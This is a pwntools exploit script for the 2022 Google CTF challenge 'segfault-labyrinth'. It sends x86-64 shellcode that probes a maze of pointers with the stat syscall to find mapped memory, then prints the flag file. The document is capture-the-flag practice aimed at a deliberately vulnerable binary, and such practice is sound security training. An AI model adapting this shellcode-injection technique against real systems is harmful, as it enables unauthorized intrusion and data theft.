#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)

if args.REMOTE:
	p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
	p = process(binary.path)

shellcode = asm(f'''
mov r15, rdi
mov r14, 10
loop1:
	dec r14
	lea rdi, [rip + filename]
	mov r13, 16
	loop2:
		dec r13
		mov rsi, qword ptr [r15 + r13*8]
		// need to skip over the 16 pointers for our stat buf
		add rsi, 16*8
		mov eax, {constants.SYS_stat}
		syscall
		test rax, rax
		jne loop2
	test r14, r14
	je end
	mov r15, qword ptr [r15 + r13*8]
	jmp loop1
end:
mov rdi, 1
mov rsi, qword ptr [r15 + r13*8]
mov rdx, 100
mov eax, {constants.SYS_write}
syscall
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
filename:
''')

if args.D: print(disasm(shellcode))
shellcode += b'flag.txt'
assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
